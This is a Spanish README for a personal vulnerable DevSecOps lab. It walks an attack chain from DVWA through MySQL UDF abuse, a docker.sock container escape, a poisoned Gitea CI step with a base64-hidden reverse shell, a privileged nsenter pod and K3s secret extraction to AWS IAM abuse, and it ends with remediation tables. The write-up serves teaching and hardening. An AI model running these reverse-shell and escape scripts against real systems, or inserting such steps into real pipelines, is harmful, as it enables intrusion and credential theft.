# DevSecOps Vulnerable Lab — Cadena de explotación end-to-end (y su remediación)

> Laboratorio personal de DEV-SEC-OPS. Simula una infraestructura de DevOps con seis capas configuradas con fallos a propósito, infra cloud en AWS (emulada en local con LocalStack), host con Docker, clúster Kubernetes (K3s), repo + CI/CD en Gitea, y las aplicaciones DVWA y MySQL.

> La idea del lab es que casi ningún fallo es crítico por separado pero sí en conjunto. Un rol IAM abierto no hace nada mientras nadie llegue a él, y un `docker.sock` a `0777` tampoco mientras ningún contenedor lo monte... (aunque quizá una subred VPC abierta a internet sí 😂😂). Lo que hace daño no son los fallos sueltos sino cómo se encadenan, empiezas subiendo un fichero malicioso en DVWA y acabas con control total de la cuenta de AWS. De cada config vulnerable dejo también su versión corregida.

> Un apunte para no liarse, la infra se levanta de abajo arriba (cloud → host → K8s → apps), pero la explotación recorre esas mismas piezas al revés, empezando por la web y terminando en el cloud, en 6 capas:
>
> `DVWA (1) → MySQL (2) → Host (3) → CI/CD (4) → K8s (5) → IaC/Cloud (6)`

![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-11%2F14%20tácticas-red)
![Layers](https://img.shields.io/badge/capas-6-8957e5)

<p align="center">
  <img src="docs/animations/01-kill-chain.gif" alt="Cadena de ataque completa, de DVWA a IaC" width="860">
  <br><em>Recorrido de la cadena, capa a capa, desde la subida del fichero en la web DVWA hasta el control a nivel cloud.</em>
</p>

<!-- GUION · 01-kill-chain.gif -----------------------------------------------
     6 nodos encendiéndose en secuencia (DVWA → MySQL → Host → CI/CD → K8s → IaC).
     Bajo cada arco aparece la CONDICIÓN que lo hace posible (config.inc.php,
     docker.sock 0777, kubeconfig root, runner secrets, PassRole *).
     ~12 s, loop suave. Formato: GIF o webm ≤ 3 MB.
------------------------------------------------------------------------------>

---

**Stack:** AWS (emulado en local con LocalStack) · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA · MySQL

---

## Decisiones de diseño

Por qué el lab está montado como está, que muchas de estas cosas salieron de pelearme horas con ellas y acabé decidiendo un poco por descarte

Uso **LocalStack en vez de AWS de verdad** por lo obvio, coste cero y sin miedo a romper una cuenta de pago real. Aunque el precio a pagar es que LocalStack no aplica IAM por defecto (lo explico en la Capa 6), así que el contraste vulnerable/hardened en cloud valida el código y no la ejecución. Llegué a valorar meter LocalStack como un pod más dentro de K3s, pero lo descarté porque rompía la jerarquía real de cloud → clúster y encima complicaba el propio LocalStack, prefería que la parte "cloud" viviera por fuera.

Corro **K3s sobre Docker** (`--docker`) en lugar de su containerd embebido, y esto no fue capricho. Con Docker y el containerd de K3s a la vez la CPU se iba al 100% porque los dos peleaban por los mismos cgroups, y sobre todo, el runner de CI/CD necesita hablar directamente con el socket de Docker del host, así que tiene sentido que haya un único motor de contenedores. De paso desactivé el `metrics-server`, que en local no aporta y consume.

Empecé con **GitLab CE y lo cambié por Gitea + Act-Runner** porque GitLab se comía tranquilamente entre 4 y 8 GB de RAM en reposo, una barbaridad para un lab que va en una VM. Por la misma razón, para el registro de contenedores descarté Harbor (que son Core, Portal, Postgres, Redis, Trivy embebido y certificados TLS quisquillosos) y tiré del **registro nativo de Gitea**, que ya estaba levantado.

El resto son decisiones de simplicidad. Va **todo en un nodo y en la misma red NAT** (`192.168.252.0/24` de VirtualBox), que en producción K3s, LocalStack, Gitea y las apps no comparten ni host ni red plana, pero aquí me interesaba poder desplegarlo entero en dos VMs. Uso **K3s y no Kubernetes completo** por peso, arranca en segundos y usa Kine sobre SQLite en vez de etcd, que es justo lo que habilita el hallazgo de `state.db` de la Capa 5. Y el **modelo de amenaza** arranca con el atacante ya dentro de DVWA, no modelo cómo llega ahí (phishing, escaneo, lo que sea) porque lo interesante no es el acceso inicial sino el pivote y la escalada una vez tienes el initial foothold.

---

## Estructura

<details>
<summary><strong>Mapa, estructura del repositorio y tabla de "Broken Access Control"</strong></summary>

### Mapa de infraestructura

Una VPC con una sola subred pública, una EC2 dentro de ella, un Security-Group que no filtra por origen, un bucket S3 sin bloqueo de acceso público y los roles IAM con más permisos de la cuenta. En el host, el firewall está apagado (`systemctl stop ufw`) y el `docker.sock` tiene permisos de escritura para todos (`0777`). A nivel de clúster, el runner de CI/CD (el que ejecuta la pipeline de Gitea) corre con `privileged: true` y monta el `docker.sock` del host dentro del propio pod. El pod de MySQL hace lo mismo, para permitir el escape al host.

> El `docker.sock` montado es la bisagra de toda la cadena, así que lo cuento a fondo una vez en la **Capa 3** y en el resto de sitios va por referencia, para no repetir cuatro veces la misma historia.

### Estructura del repositorio

```
.
├── 01-cloud-iac
│   ├── hardened/            # Misma infraestructura, versión endurecida
│   └── vulnerable/          # ec2.tf · iam.tf · network.tf · provider.tf · s3.tf
├── 02-provisioning
│   ├── site_hardened.yml
│   └── site_vulnerable.yml
├── 03-k8s-cluster
│   ├── act-runner.yaml
│   └── gitea-deployment.yaml
└── 04-cicd-pipeline
    └── devsecops-demo/
        ├── .gitea/workflows/    # Pipelines CI/CD
        ├── k8s/vulnerable/      # DVWA + MySQL
        └── src/vulnerable/      # Código fuente DVWA
```

### Controles de seguridad rotos

| Control roto | Fichero | Vulnerabilidad | Severidad | Se explota en |
|---|---|---|---|---|
| **Identidad (IAM)** | `iam.tf` | Trust policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | `iam:PassRole` sin restricción de `Resource` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | Usuario con `AdministratorAccess` directo | 🔴 Crítica | Capa 6 |
| **Acceso a red** | `network.tf` | SSH (22) abierto a `0.0.0.0/0` | 🟠 Alta | Capa 3 |
| **Acceso a red** | `network.tf` | Docker API sin cifrar (2375) a `0.0.0.0/0` | 🟠 Alta (hallazgo de escáner, no explotado) | — |
| **Acceso a red** | `network.tf` | Egress sin restricción | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bloqueo de acceso público desactivado | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bucket policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Aislamiento (host)** | `site_vulnerable.yml` | UFW desactivado | 🟠 Alta | Capa 3 |
| **Aislamiento (host)** | `site_vulnerable.yml` | `docker.sock` con permisos `0777` | 🔴 Crítica | Capa 3 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | Runner en `privileged: true` | 🔴 Crítica | Capa 4 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | `docker.sock` del host montado en el pod | 🔴 Crítica | Capa 4 |
| **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`/`INTERNAL_TOKEN`/`JWT_SECRET` hardcodeados | 🟠 Alta | Capa 4 |

> **Sobre el puerto 2375.** El SG abierto en 2375 no se explota en este lab, haría falta que la API de Docker escuchara ahí sin autenticación y no lo hace, que la entrada real es el socket Unix a `0777` de la Capa 3. Lo dejo como Alta y no como crítico, aunque un escáner automático lo reportaría como crítico a ciegas. Es justo el tipo de hallazgo que un escáner sobrevalora sin saber el contexto.

### Configuración vulnerable (extracto)

```hcl
# iam.tf — cualquier principal puede asumir el rol, pasar cualquier rol, y hay un admin directo
resource "aws_iam_role" "overprivileged_role" {
  assume_role_policy = jsonencode({ Statement = [{ Action = "sts:AssumeRole", Effect = "Allow", Principal = "*" }] })
}
resource "aws_iam_policy" "passrole_unrestricted" {
  policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "iam:PassRole", Resource = "*" }] })
}
resource "aws_iam_user_policy_attachment" "user_admin_attach" {
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
```

```yaml
# site_vulnerable.yml — configuración de host que habilita el control de Docker
- name: Desactivar Firewall (UFW)
  ufw: { state: disabled }
- name: Socket de Docker con permisos para todos los usuarios (0777)
  file: { path: /var/run/docker.sock, mode: '0777' }
```

</details>

---

## Explotación de la cadena

Conviene manejar lo básico de SQL, PHP, Bash/Python y manifiestos/config-files de Kubernetes por encima, entender contenedores, orquestación e IaC a nivel conceptual, y tener el laboratorio desplegado con conectividad entre el Kali (`192.168.252.20`) y el clúster (`192.168.252.10`). Por facilidad de configuración los metí en la misma red NAT de VirtualBox (`192.168.252.0/24`).

<p align="center">
  <img src="docs/animations/02-progress.gif" alt="Progreso de la cadena, capa a capa" width="720">
  <br><em>Estado de la cadena a medida que se compromete cada capa.</em>
</p>

<!-- 02-progress.gif · opcional: la línea [✓] DVWA → [✓] MySQL → ... marcándose sola. ~6 s -->

<details open>
<summary><strong>Capa 1 · Acceso inicial — DVWA</strong></summary>

La aplicación web DVWA tiene muchas entradas directas, pero por simplicidad solo se explotan y documentan las que dan acceso inicial sin mayor complicación (el objetivo no es documentar todo el OWASP Top 10 Web, sino el conjunto de una attack-chain a lo largo de la infra): Command Injection, Local File Inclusion (LFI) —usando Log Poisoning con Path Traversal— y File Upload (subiendo la `shell.php`) combinado con LFI. Otros ataques como la SQLi (blind o normal) o el Cross/Server-Side Request Forgery (C/S-SRF) solo exfiltrarían datos o dependerían de que otro usuario interactuara con la web (robo de cookies).

Antes de pensar en pivotar, se mira si el propio contenedor de DVWA da para escalar o salir del host. No hay nada:

```bash
whoami                                   # → www-data
sudo -l                                  # → sudo: command not found
getcap -r / 2>/dev/null                  # → (vacío: sin binarios con capabilities)
grep Cap /proc/self/status               # → CapEff: 0000000000000000
ls -la /var/run/docker.sock              # → No such file or directory
cat /proc/mounts                         # → solo montajes estándar de K8s, sin binds del host
ls /var/run/secrets/.../serviceaccount/  # → token presente, pero localsubjectrulesreviews → 403
env                                      # → solo variables de Apache, sin credenciales
```

El contenedor de DVWA está bien aislado. Apunto igualmente la enumeración porque justifica el siguiente paso, si en local no hay por dónde escalar toca moverse lateralmente.

Todo el reconocimiento va en PHP, sin `nmap`. Las credenciales de MySQL están en claro en el config de DVWA:

```bash
cat /var/www/html/config/config.inc.php
# $_DVWA['db_user']     = 'app'
# $_DVWA['db_password'] = 'vulnerables'
```

```php
// Verificación de credenciales, solo con PHP (sin nc, sin curl)
php -r '$c=new mysqli("mysql-service","app","vulnerables"); echo $c->connect_error?"FAIL":"OK";'   // → OK
php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW GRANTS"); while($x=$r->fetch_row()) echo $x[0];'
// → GRANT ALL PRIVILEGES ON `dvwa`.* TO 'app'@'%'
```

Un par de cosas del entorno que conviene tener claras antes de tocar nada. DVWA lleva la dificultad por cookie (`security=low`), y si la subes a Medium o High cambian los filtros y varios de estos vectores ya no salen tal cual. Si en el `php.ini` están capadas `system`/`exec`/`passthru` con `disable_functions`, todo el reconocimiento por `php -r` hay que reescribirlo con lo que quede. Y el Log Poisoning depende de dar con la ruta real del access log de Apache (lo típico, `/var/log/apache2/access.log`) e inyectar el payload por el User-Agent antes de incluir el log con el LFI.

#### Ficha de riesgo — DVWA

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF + validación estricta de extensión/contenido en uploads |
| Execution | Command & Scripting Interpreter: PHP | T1059.004 | Deshabilitar ejecución de scripts en directorios de upload |
| Discovery | Network Service Discovery | T1046 | NetworkPolicy entre namespaces |
| Credential Access | Credentials in Files | T1552.001 | Secretos en Vault/Secrets Manager, nunca en ficheros de app |

</details>

<details>
<summary><strong>Capa 2 · Pivote a MySQL — UDF Abuse</strong></summary>

El pod de **MySQL** corre con `privileged: true`, `SYS_ADMIN` y el `docker.sock` del host montado dentro. El montaje es para la Capa 3, aquí solo busco ejecución de comandos en el contenedor.

```yaml
# mysql-deployment (vulnerable)
securityContext:
  capabilities: { add: [SYS_ADMIN] }
  privileged: true
volumeMounts:
  - { mountPath: /var/run/docker.sock, name: docker-sock }
volumes:
  - hostPath: { path: /var/run/docker.sock, type: Socket }
    name: docker-sock
```

**UDF Abuse.** No hay bug de MySQL de por medio, entro con las credenciales de la Capa 1 y abuso de la carga de funciones definidas por el usuario. Antes de nada hay tres cosas que mirar sí o sí, porque si alguna no está como toca el vector no va:

```sql
SELECT @@secure_file_priv;   -- debe estar VACÍO ('') para que INTO DUMPFILE escriba fuera de su carpeta
SELECT @@plugin_dir;         -- ruta real del plugin_dir, NO la asumas
SHOW GRANTS;                 -- necesito el privilegio FILE
```

La primera y la que más rabia da es `secure_file_priv`, que en mysql:5.7 el valor por defecto suele ser `/var/lib/mysql-files/` o `NULL` y con cualquiera de los dos el `INTO DUMPFILE` fuera de esa carpeta falla, o sea que esto solo tira si está vacío, no es algo que "simplemente sale". La segunda es el `plugin_dir`, yo escribo a `/usr/lib64/mysql/plugin/` que es convención de RHEL, pero la imagen oficial de Debian lo tiene en `/usr/lib/mysql/plugin/`, así que mejor no asumirlo y sacar la ruta del `SELECT @@plugin_dir`. Y la tercera, la `.so` de Metasploit tiene que casar en arquitectura y glibc con el contenedor o el `CREATE FUNCTION` peta al cargar el símbolo.

Desde la shell de DVWA como `www-data`, con eso comprobado:

```php
// 1 — Subir la librería UDF a una tabla auxiliar (hex)
$so  = file_get_contents("https://raw.githubusercontent.com/Rapid7/metasploit-framework/master/data/exploits/mysql/lib_mysqludf_sys_64.so");
$c   = new mysqli("mysql-service","app","vulnerables","dvwa");
$c->query("CREATE TABLE IF NOT EXISTS udf_blob(line LONGBLOB)");
$c->query("INSERT INTO udf_blob VALUES(UNHEX('".bin2hex($so)."'))");

// 2 — Volcar la .so al plugin_dir REAL (el que devolvió SELECT @@plugin_dir)
$c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so'");

// 3 — Registrar sys_eval y confirmar la ejecución de comandos
$c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so'");
$r = $c->query("SELECT sys_eval('id') AS cmd")->fetch_assoc();
// → uid=999(mysql) gid=999(mysql)
```

Ya ejecuto comandos en el contenedor de MySQL como uid 999. El escape al host va en la Capa 3.

MITRE aquí es T1203 (UDF abuse), y la mitigación es restringir el privilegio `FILE` y acotar `secure_file_priv`. La ficha completa la dejo en las capas donde el vector es menos evidente.

</details>

<details>
<summary><strong>Capa 3 · Escape al host vía docker.sock</strong></summary>

El pod de MySQL tiene dentro el `/var/run/docker.sock` (montaje declarado en el manifiesto de la Capa 2). Con ejecución como `mysql` y ese socket, puedo crear contenedores en el daemon del host y salir por ahí. Es la parte más "fina" de toda la cadena.

La imagen de MySQL va bastante pelada, de red y de montaje no tiene nada, ni la CLI de Docker, ni `curl`, ni `netcat`, ni `mount`/`chroot`/`nsenter`, lo único que trae es un intérprete de Python, así que las peticiones a la API de Docker Engine las hago a mano sobre el socket Unix con el módulo `socket`.

<p align="center">
  <img src="docs/animations/03-docker-escape.gif" alt="Escape de contenedor a root en el host vía docker.sock" width="820">
  <br><em>Contenedor MySQL → contenedor efímero con <code>Binds: /:/mnt/host</code> → root en el nodo.</em>
</p>

<!-- GUION · 03-docker-escape.gif -------------------------------------------
     Split screen: izquierda el pod MySQL (uid 999), derecha el host.
     Se dibuja la petición HTTP cruda al socket, nace `escape1` (alpine),
     el chroot al host montado, y el prompt cambia a root@host. ~15 s.
------------------------------------------------------------------------------>

```python
# escape.py — crea un contenedor efímero con el host montado y NetworkMode host
import socket, json, base64
cmd = "chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/192.168.252.20/5555 0>&1'"
payload = json.dumps({
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh","-c","echo "+base64.b64encode(cmd.encode()).decode()+" | base64 -d | sh"],
    # Lo imprescindible es Binds (montar el host) + NetworkMode host (que salga la reverse shell).
    # Privileged NO hace falta para este escape, con el bind de / y el chroot ya sales.
    "HostConfig": {"Binds": ["/:/mnt/host"], "NetworkMode": "host"}
})

def call(path, body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/var/run/docker.sock")
    if body is None:
        req = "POST %s HTTP/1.1\r\nHost: localhost\r\n\r\n" % path
    else:
        req = ("POST %s HTTP/1.1\r\nHost: localhost\r\n"
               "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
               % (path, len(body), body))
    s.sendall(req.encode())
    resp = s.recv(4096)          # leer la respuesta, si no no sabes si el create/start ha fallado
    s.close()
    return resp

# Fijo la versión de API en la URL (que case con `docker version` del daemon)
print(call("/v1.41/containers/create?name=escape1", payload))   # esperado: 201 Created
print(call("/v1.41/containers/escape1/start"))                  # esperado: 204 No Content
```

Varios campos del payload salieron de pelear con fallos que no daban error visible pero se quedaban sin hacer nada, y no recibía la reverse-shell en el Kali:

- **`alpine` en vez de `mysql:5.7`.** La imagen de MySQL no lleva `mount`, `chroot` ni `nsenter`, pero Alpine sí. Para ver qué trae una imagen, arranco el contenedor efímero con `which mount chroot nsenter` y leo los logs a ver si se queja.
- **`NetworkMode: host`.** Sin esto el contenedor efímero se queda en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` sale por el NAT de Docker, se pierde y no avisa. Con `host` comparte la red del nodo, sin NAT, y la conexión sale.
- **`Binds: ["/:/mnt/host"]` en vez de `mount --bind`.** El daemon resuelve `Binds` antes de arrancar el contenedor. Montar a mano dentro del comando choca con los puntos de montaje y encima pide tener `mount` en la imagen.
- **Base64.** Me evita el quoting anidado entre PHP, el JSON y la shell del contenedor, que rompía el script.
- **Sin f-strings.** El Python del contenedor de MySQL es 2, así que concateno los strings con `+`.
- **Leer la respuesta del socket.** Lo añadí después de perder tiempo, que el `create`/`start` puede fallar en silencio y leyendo el `201`/`204` (o el error) sabes al momento si tiró o no.

Cuando la conexión entra en el `nc -lvnp 5555`, la shell es root en el host. El `chroot` al filesystem montado te deja directamente en el anfitrión.

#### Ficha de riesgo — Escape al host

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | No montar `docker.sock` en pods; runtime rootless / gVisor |
| Privilege Escalation | Abuse Elevation Control: Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` mediante PSA / OPA |
| Lateral Movement | Container Administration Command | T1021.007 | TLS mutuo obligatorio en el Docker Engine API |

Un contenedor de base de datos (y ninguno, salvo casos muy muy especiales) no tiene por qué tocar el daemon de Docker bajo ningún concepto. Aquí se simula que lo tiene porque venía de "una config de builds en local que nadie quitó al desplegar" o cualquier otra historia. Por lo demás, a nivel de manifiestos el pod está aislado.

</details>

<details>
<summary><strong>Capa 4 · CI/CD — Gitea / Act-Runner</strong></summary>

Con root en el host, los datos de Gitea (van en un `hostPath`) se leen directamente:

```bash
cat /var/lib/gitea-data/app.ini
# [security] SECRET_KEY = secretkeylabdevsecops
#            INTERNAL_TOKEN = eyJhbGci...
# [oauth2]   JWT_SECRET = eyJhbGci...
```

`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna y `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en claro puedo falsificar sesiones o tokens sin tener usuario. El manifiesto del runner además deja su token de registro a la vista en el comando de arranque.

**Poisoned Pipeline Execution (PPE).** El runner ejecuta los jobs en el mismo contexto que los legítimos (`docker.sock` del host, `privileged: true`), así que con una línea en un workflow basta. Va disfrazado de paso normal:

```yaml
- name: Gitleaks Scan
  continue-on-error: true          # el job se reporta OK aunque el paso legítimo falle
  run: |
    nohup bash -c "$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn | base64 -d)" >/dev/null 2>&1 &
    gitleaks detect --source="."   # → decodificado: bash -i >& /dev/tcp/192.168.252.20/4488 0>&1
```

El `base64` con `continue-on-error` hace que en una revisión rápida de PR el paso pase por un escaneo de secretos, el pipeline salga en verde y la reverse shell arranque aparte.

**De lo que más me peleé fue de esta capa**, así que dejo aquí lo que me rompió por si le sirve a alguien.

El registro del runner fue lo peor con diferencia. Estuve un buen rato regenerando el token y reaplicando el `Secret` de Kubernetes una y otra vez, probé generarlo por CLI, probé el token de repositorio en vez del de instancia y lo único que saqué fue un error distinto (`unimplemented: 404 Not Found`) porque el daemon hace ping contra la raíz de la instancia y yo le estaba pasando la URL del repo. Al final resultó que el `act_runner register` estaba hardcodeado dentro del `command` del Deployment con un token viejo, así que daba igual lo que tocara en el `Secret`, el Deployment ni lo miraba... Lo arreglé generando un token de instancia nuevo y editando el Deployment a mano con `kubectl edit` (con `patch` no, porque se me colaban caracteres invisibles copiados del chat y rompían el JSON), luego borré el `.runner` de antes y reinicié el pod. Lo suyo sería inyectar el token con `secretKeyRef` para que el `Secret` mande de verdad, pero eso lo dejé pendiente.

El otro clásico fue el DNS. El checkout fallaba siempre con `Could not resolve host: gitea-service.gitea.svc.cluster.local` y me tiré un rato dando palos de ciego, montando el `resolv.conf` del host, metiendo `extra_hosts` apuntando al ClusterIP, luego al puerto 3000 de la IP del host... nada. La razón es que los jobs del runner corren como contenedores del Docker del host, fuera de la red de pods de K3s, así que un nombre `*.svc.cluster.local` no lo van a resolver nunca. Y aunque lo resolvieran, Gitea es NodePort, el 3000 solo vale dentro del clúster y de fuera solo responde el 30000. La solución fue registrar el runner contra la URL NodePort del host (`http://192.168.252.10:30000`) y olvidarme del DNS interno.

Un par más rápidos. El `Duplicate mount point: /var/run/docker.sock` era que el socket se montaba dos veces, una en el `volumeMounts` del Deployment y otra dentro del `config.yaml` del propio runner, quité el duplicado y arreglado. Y las Actions oficiales de Trivy y Gitleaks (`aquasecurity/trivy-action`, `gitleaks/gitleaks-action`) no tiran en un Gitea autoalojado, por dentro llaman a `api.github.com` o clonan de GitHub, así que las acabé ejecutando como contenedor directo con `docker run` en el `run:`, que además es justo lo que aprovecha el PPE de arriba. Detalle tonto que me costó otro rato, el `run:` hay que escribirlo en una sola línea, con los `\` de continuación el runner interpretaba mal los saltos.

#### Ficha de riesgo — CI/CD

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Supply Chain Compromise (CI/CD) | T1195.002 | CODEOWNERS + protected branches en `.gitea/workflows/` |
| Credential Access | Credentials in Files | T1552.001 | Secretos fuera del ConfigMap (gestor de secretos) |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros, sin `privileged` ni socket |
| Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (patrón `base64 -d \| sh`) |

Aquí no escalo nada. El runner ya lleva lo que necesita para desplegar (`kubeconfig`, credenciales cloud, claves de firma), y comprometerlo hereda todo eso.

</details>

<details>
<summary><strong>Capa 5 · Kubernetes (K3s)</strong></summary>

Se llega al clúster de dos maneras, y en real rara vez tienes las dos. Con el escape de la Capa 3, el `kubeconfig` de `cluster-admin` se lee del host en `/etc/rancher/k3s/k3s.yaml`. Aparte, el Act-Runner suele llevar credenciales de despliegue equivalentes como secreto.

**Pod con acceso al PID 1 del host:**

```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata: { name: node-access-pod }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine:latest
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]   # los flags -u/-i no siempre hacen falta, pero no molestan
    securityContext: { privileged: true }
    volumeMounts: [{ mountPath: /host, name: host-root }]
  volumes: [{ name: host-root, hostPath: { path: / } }]
```

<p align="center">
  <img src="docs/animations/04-nsenter.gif" alt="Acceso al namespace PID 1 del host vía nsenter" width="820">
  <br><em><code>nsenter -t 1 -m -u -i -n sh</code>: entrar al namespace del proceso init equivale a una sesión root en el nodo.</em>
</p>

<!-- 04-nsenter.gif · el pod node-access-pod aplicándose y el prompt volviéndose root del nodo -->

El otro hallazgo es `state.db`. K3s guarda el estado en Kine sobre SQLite en disco (`etcd` es opcional y aquí no está). Los Secrets están en base64 y sin cifrar en reposo mientras no actives `--secrets-encryption`, que viene apagado. Ojo con una cosa, no puedes abrir `state.db` directamente mientras K3s corre, SQLite lo tiene bloqueado y `sqlite3` te suelta `database is locked`, así que hay que copiarlo primero y leer la copia:

```bash
cp /var/lib/rancher/k3s/server/db/state.db /tmp/state.db
sqlite3 /tmp/state.db "SELECT name,value FROM kine WHERE name LIKE '%secret%';"
echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI/CD
```

#### Ficha de riesgo — Kubernetes

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | PSA `restricted`; prohibir `hostPID`/`hostNetwork`/`hostPath` |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | `--secrets-encryption`; migrar a `etcd` cifrado |

(RBAC y disponibilidad los cubro en la matriz completa, no aquí.) Un pod con `privileged: true` y `hostPath: /` es root en el nodo, sin más.

</details>

<details>
<summary><strong>Capa 6 · IaC / Cloud</strong></summary>

Con las credenciales AWS que salen de Kine (o del runner), los tres hallazgos que ya se veían en el código de arquitectura dejan de ser teoría:

```bash
export AWS_ACCESS_KEY_ID=<extraído>; export AWS_SECRET_ACCESS_KEY=<extraído>
aws sts get-caller-identity --endpoint-url=http://192.168.252.10:4566

aws iam list-attached-user-policies --user-name dev-user-admin --endpoint-url=...
# → arn:aws:iam::aws:policy/AdministratorAccess

aws sts assume-role --role-arn arn:aws:iam::000000000000:role/devsecops-unrestricted-role \
  --role-session-name lab-session --endpoint-url=...   # → éxito: trust policy Principal: "*"

aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   # sin credenciales
```

> **⚠ El agujero honesto del lab.** LocalStack no aplica IAM por defecto. Salvo que arranques con `ENFORCE_IAM=1` (y aun así solo a medias), el `assume-role` con `Principal: "*"`, el `PassRole` sin `Resource`, el Block Public Access y la bucket policy tienen éxito igual en la versión vulnerable y en la endurecida, porque LocalStack te deja hacerlo de todas formas. O sea que el contraste vulnerable/hardened en cloud no demuestra nada a nivel de ejecución, solo que `tfsec`/`checkov` marcan el código. Lo pongo bien claro porque es la mayor limitación del lab, y es algo que asumo a propósito, no un descuido.

Qué es fiel y qué es teatro por culpa de LocalStack:

| Pieza | ¿Se valida de verdad? |
|---|---|
| S3 put/get/listado | Sí, funciona de forma realista |
| S3 Block Public Access | Parcial, el "público vs privado" no se enforcea como en AWS |
| Evaluación de políticas IAM | No por defecto (necesita `ENFORCE_IAM=1`) |
| `sts:AssumeRole` con trust policy | Teatro sin `ENFORCE_IAM`, asume el rol igualmente |
| SG / reglas de red EC2 | Solo metadata, no hay filtrado de tráfico real |
| Detección estática del código (`tfsec`/`checkov`) | Sí, y es lo que de verdad valida esta capa |

El peor de los tres hallazgos es el `iam:PassRole` sin `Resource` acotado. Permite asignar cualquier rol de la cuenta a cualquier servicio, o sea escalada persistente. Y es el que más cuesta ver en una revisión, que un usuario con `AdministratorAccess` lo pilla cualquiera, pero este parece de bajo privilegio hasta que alguien lo usa para colgarse un rol gordo.

Una nota práctica, contra LocalStack el `--endpoint-url` va en cada comando, que es un incordio, contra AWS de verdad esto iría directo. Lo aviso porque copiar y pegar sin el endpoint da errores raros que no dicen nada.

Todo lo que hace posible la cadena sale de este mismo Terraform, desde el SG abierto hasta los pods `privileged`.

#### Ficha de riesgo — IaC / Cloud

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | IAM de mínimo privilegio; revisión de `AdministratorAccess` |
| Privilege Escalation | Abuse Elevation Control: PassRole | T1548 | `Resource` acotado en toda policy con `iam:PassRole` |
| Initial Access | Trusted Relationship / Valid Accounts | T1199/T1078 | `Principal` explícito, nunca `"*"` |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 Block Public Access a nivel de cuenta |

</details>

---

## Remediación y hardening

Para cada fallo, el diff y el control que lo restaura. Donde tiene sentido, qué meter en el pipeline para que no se cuele otra vez.

<p align="center">
  <img src="docs/animations/05-diff-toggle.gif" alt="Comparación entre la versión vulnerable y la endurecida del mismo fichero" width="820">
  <br><em>Comparación entre las versiones vulnerable y endurecida del mismo fichero.</em>
</p>

<!-- GUION · 05-diff-toggle.gif ---------------------------------------------
     Un fichero (p. ej. iam.tf) alternando entre las dos versiones, con las
     líneas rojas (-) desapareciendo y las verdes (+) entrando. ~8 s, loop.
------------------------------------------------------------------------------>

### Resumen

| Capa | Vulnerabilidad | Fix | Pre | Post | Control sistémico |
|---|---|---|:--:|:--:|---|
| IAM | `Principal = "*"` en trust policy | `Principal` a ARN concreto + `ExternalId` | 🔴 | 🟢 | `tfsec`/`checkov` en PR |
| IAM | `PassRole` con `Resource = "*"` | `Resource` acotado por ARN | 🔴 | 🟢 | SCPs en AWS Organizations |
| IAM | `AdministratorAccess` directo | Política de mínimo privilegio | 🔴 | 🟢 | IAM Access Analyzer |
| Red | SSH + Docker API a `0.0.0.0/0` | CIDR restringido; 2375 eliminado | 🟠 | 🟢 | `tfsec aws-ec2-no-public-ingress-sgr` |
| S3 | Bucket público (`Put`/`Get` `*`) | Block Public Access + policy eliminada | 🔴 | 🟢 | S3 BPA a nivel de cuenta |
| Host | UFW deshabilitado | UFW `deny` + ingress explícito | 🟠 | 🟢 | `ansible-lint` + `inspec` |
| Host | `docker.sock` `0777` | `0660`, grupo `docker` | 🔴 | 🟢 | Docker rootless |
| K8s | `privileged` + `hostPath: /` | `privileged: false`, sin `hostPath` | 🔴 | 🟢 | Pod Security Admission `restricted` |
| K8s | Kine sin cifrado | `--secrets-encryption` | 🟠 | 🟠 | Migración a `etcd` cifrado |
| CI/CD | Secretos en ConfigMap | Secret / OIDC federation | 🔴 | 🟢 | Gitleaks pre-commit + OIDC |
| CI/CD | Runner `privileged` + socket | Runner sin socket; Kaniko/Buildah | 🔴 | 🟢 | Runners efímeros |
